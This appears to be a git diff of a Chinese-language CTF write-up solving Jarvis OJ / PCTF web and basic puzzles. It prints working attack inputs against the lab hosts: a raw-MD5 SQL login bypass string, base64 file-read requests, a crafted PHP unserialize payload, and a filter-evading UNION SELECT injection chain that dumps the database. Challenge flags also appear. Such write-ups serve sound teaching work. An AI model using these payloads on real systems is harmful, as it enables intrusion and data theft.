@@ -25,7 +25,7 @@ Yeah!! Here's your flag:PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}
 Hint:"select * from `admin` where password='".md5($pass,true)."'"
 ```
 
-最终在数据库执行的是 *select * from   \`admin\`  where password='xxx'* ，其中xxx是哈希处理过的，我们无法直接操控。但是因为 *md5($pass,true)*  返回的是16字节的二进制串(而不是常见的32位十六进制串)，解释成字符串就可能出现`''.join(map(chr,xrange(256)))` 中的任何一个，那么如果十六字节的字符串中能出现`bla'or'1bla` 或是`bla'||'1bla` 这样的形式，即符合 `re.compile("'or'[1-9]|'\|\|'[1-9]", re.I)`  这种pattern的，拼接后就可以绕过比较。平均算起来，大约每`256**5/5/9/(16-5)=2221235611` 也就是22亿个哈希值中可能出现一个我们想要的，我大概7分钟算一亿个，运气好三个小时能算出一个来，然而不想算。别处看到两个 `ffifdyop`和`129581926211651571912466741651878684928` 。
+最终在数据库执行的是 *select * from   \`admin\`  where password='xxx'* ，其中xxx是哈希处理过的，我们无法直接操控。但是因为 *md5($pass,true)*  返回的是16字节的二进制串(而不是常见的32位十六进制串)，解释成字符串就可能出现`''.join(map(chr,xrange(256)))` 中的任何一个，那么如果十六字节的字符串中能出现`foo'or'1bar` 或是`foo'||'1bar` 这样的形式，即符合 `re.compile("'or'[1-9]|'\|\|'[1-9]", re.I)`  这种pattern的，拼接后就可以绕过比较。平均算起来，大约每`256**5/5/9/(16-5)=2221235611` 也就是22亿个哈希值中可能出现一个我们想要的，我大概7分钟算一亿个，运气好三个小时能算出一个来，然而不想算。别处看到两个 `ffifdyop`和`129581926211651571912466741651878684928` 。
 
 > string **md5**    ( string `$str`   [, bool `$raw_output` = false  ] )
 >
@@ -132,4 +132,270 @@ in=inv(o)*r'
 res=''.join(map(chr,[81,87,66,123,82,51,97,99,55,95,49,115,95,105,110,116,101,114,101,115,116,105,110,103,125]))
 'QWB{R3ac7_1s_interesting}'
 ```
+
+#### 神盾局的秘密
+
+> 这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？
+>
+> 题目入口：http://web.jarvisoj.com:32768/
+
+看到图片地址是 *showimg.php?img=c2hpZWxkLmpwZw==* ，其中img参数的值是 *shield.jpg* 的base64编码，也许可以读文件。读到 showimg.php，index.php，shield.php如下：
+
+```php
+//showimg.php
+//view-source:http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=
+<?php
+	$f = $_GET['img'];
+	if (!empty($f)) {
+		$f = base64_decode($f);
+		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
+		&& stripos($f,'pctf')===FALSE) {
+			readfile($f);
+		} else {
+			echo "File not found!";
+		}
+	}
+?>
+```
+
+```php
+//index.php
+//view-source:http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw
+<?php 
+	require_once('shield.php');
+	$x = new Shield();
+	isset($_GET['class']) && $g = $_GET['class'];
+	if (!empty($g)) {
+		$x = unserialize($g);
+	}
+	echo $x->readfile();
+?>
+<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
+```
+
+```php
+//shield.php
+//view-source:http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==
+<?php
+	//flag is in pctf.php
+	class Shield {
+		public $file;
+		function __construct($filename = '') {
+			$this -> file = $filename;
+		}
+		
+		function readfile() {
+			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
+			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
+				return @file_get_contents($this->file);
+			}
+		}
+	}
+?>
+
+```
+
+可以看到 index.php 中传入反序列化函数的是可控的参数，shield.php 提示flag在pctf.php，readfile() 函数又没有过滤，所以构造一下参数即可。
+
+```php
+class Shield{
+	public $file='pctf.php';
+}
+var_dump(serialize(new Shield()));
+//string(43) "O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}"
+//然后访问 
+//view-source:http://web.jarvisoj.com:32768/index.php?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}
+```
+
+`Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}` 
+
+#### PORT51
+
+> 题目链接：http://web.jarvisoj.com:32770/
+
+要求用51端口访问，指的是用本地的51端口（如果不指定会使用一个随机高端口）。
+
+```shell
+[root@yun ~]# curl --local-port 51 http://web.jarvisoj.com:32770/
+<!DOCTYPE html>
+<html>
+<head>
+<title>Web 100</title>
+<style type="text/css">
+	body {
+		background:gray;
+		text-align:center;
+	}
+</style>
+</head>
+
+<body>
+	<h3>Yeah!! Here's your flag:PCTF{M45t3r_oF_CuRl}</h3>	
+</body>
+</html>
+
+```
+
+`PCTF{M45t3r_oF_CuRl}`
+
+#### IN A Mess
+
+> 连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。
+>
+> 题目入口：http://web.jarvisoj.com:32780/
+
+源代码提示index.phps，访问发现：
+
+```php
+//view-source:http://web.jarvisoj.com:32780/index.phps
+<?php
+error_reporting(0);
+echo "<!--index.phps-->";
+if(!$_GET['id'])
+{
+	header('Location: index.php?id=1');
+	exit();
+}
+$id=$_GET['id'];
+$a=$_GET['a'];
+$b=$_GET['b'];
+if(stripos($a,'.'))
+{
+	echo 'Hahahahahaha';
+	return ;
+}
+$data = @file_get_contents($a,'r');
+if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
+{
+	require("flag.txt");
+}
+else
+{
+	print "work harder!harder!harder!";
+}
+?>
+```
+
+构造`id='null'&b=%00findneo&a=php://input`，然后在hackbar里post`1112 is a nice lab!` 得到`﻿Come ON!!! {/^HT2mCpcvOLf}` （其实id传任意字母都可以）。大括号里的字符串以正斜杆开头，题目说flag放的地方很混乱，都暗示这是url的一部分，访问`http://web.jarvisoj.com:32780//^HT2mCpcvOLf` 自动跳转到`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1` ，加单引号返回SQL语句，显然是要继续注入。
+
+稍作尝试发现，union、select、from会被删除，用大写即可。空格、%20、`/**/`会被拦截，可以用`/**union/` 、`/union**/` 、  `/*a*/` 混合绕过，猜不到后端怎么写的，挺奇怪。
+
+```sql
+二分法确定当前列数为3
+view-source:http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1/*a*/order/*a*/by/*a*/3
+```
+
+```sql
+确定回显列为第三列
+view-source:http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1/*a*/and/*a*/0/*a*/UNION/*a*/SELECT/union**/1,2,3
+```
+
+```sql
+查得当前数据库名为test
+view-source:http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1/*a*/and/*a*/0/*a*/UNION/*a*/SELECT/union**/1,2,schema()
+```
+
+```sql
+查得当前数据库只有一个表，为content
+view-source:http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1/*a*/and/*a*/0/*a*/UNION/*a*/SELECT/union**/1,2,group_concat(TABLE_NAME)/**union/FROM/union**/information_schema.tables/*a*/where/*a*/table_schema=schema()
+```
+
+```sql
+查得当前表有三个字段，为id,context,title
+view-source:http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1/*a*/and/*a*/0/*a*/UNION/*a*/SELECT/union**/1,2,group_concat(COLUMN_NAME)/**union/FROM/union**/information_schema.columns/*a*/where/*a*/table_schema=schema()
+```
+
+```sql
+查得当前表内容： 1+PCTF{Fin4lly_U_got_i7_C0ngRatulation5}+hi666
+view-source:http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1/*a*/and/*a*/0/*a*/UNION/*a*/SELECT/union**/1,2,concat_ws(0x2b,id,context,title)/**union/FROM/union**/content
+```
+
+`PCTF{Fin4lly_U_got_i7_C0ngRatulation5}` 
+
+
+
+### BASIC
+
+#### 关于USS Lab.
+
+> USS的英文全称是什么，请全部小写并使用下划线连接_，并在外面加上PCTF{}之后提交
+
+`PCTF{ubiquitous_system_security}`
+
+#### base64?
+
+> GUYDIMZVGQ2DMN3CGRQTONJXGM3TINLGG42DGMZXGM3TINLGGY4DGNBXGYZTGNLGGY3DGNBWMU3WI===
+
+先base32解码再十六进制转ASCII码
+
+`PCTF{Just_t3st_h4v3_f4n}`
+
+#### veryeasy
+
+> 使用基本命令获取flag
+>
+> [veryeasy.d944f0e9f8d5fe5b358930023da97d1a](https://dn.jarvisoj.com/challengefiles/veryeasy.d944f0e9f8d5fe5b358930023da97d1a)
+
+搜索字符串。`PCTF{strings_i5_3asy_isnt_i7}`
+
+#### Secret
+
+> 传说中的签到题
+>
+> 题目入口：http://web.jarvisoj.com:32776/
+>
+>
+> Hint1: 提交格式PCTF{你发现的秘密}
+
+在响应头。`PCTF{Welcome_to_phrackCTF_2016}`
+
+#### 公倍数
+
+> 请计算1000000000以内3或5的倍数之和。
+>
+> 如：10以内这样的数有3,5,6,9，和是23
+>
+> 请提交PCTF{你的答案}
+
+ `PCTF{233333333166666668}`
+
+```python
+n = 1000000000
+def f(a, b):return (b + a / b * b) * (a / b) / 2
+print 'PCTF{%s}'%str(f(n, 3) + f(n, 5) - f(n, 15))
+```
+
+#### 爱吃培根的出题人
+
+> 听说你也喜欢吃培根？那我们一起来欣赏一段培根的介绍吧：
+>
+> bacoN is one of aMerICa'S sWEethEartS. it's A dARlinG, SuCCulEnt fOoD tHAt PaIRs FlawLE
+>
+> 什么，不知道要干什么？上面这段巨丑无比的文字，为什么会有大小写呢？你能发现其中的玄机吗？
+>
+> 提交格式：PCTF{你发现的玄机}
+
+```python
+s = "bacoN is one of aMerICa'S sWEethEartS. it's A dARlinG, SuCCulEnt fOoD tHAt PaIRs FlawLE"
+r = ''
+for i in s:
+    if i.isupper():
+        r += 'b'
+    if i.islower():
+        r += 'a'
+print r ## aaaabaaaaaaaabaabbababbaaabaaabaaababbaaabbabbaabaaabababbababbabaaabb
+# 第一种方式：
+# A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab
+# K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb
+# U babaa V babab W babba X babbb Y bbaaa Z bbaab
+# 第二种方式[v]
+# a AAAAA g AABBA 	n ABBAA t BAABA
+# b AAAAB h AABBB 	o ABBAB u-v BAABB
+# c AAABA i-j ABAAA p ABBBA w BABAA
+# d AAABB k ABAAB 	q ABBBB x BABAB
+# e AABAA l ABABA 	r BAAAA y BABBA
+# f AABAB m ABABB 	s BAAAB z BABBB
+```
+
+`PCTF{baconisnotfood}`
 
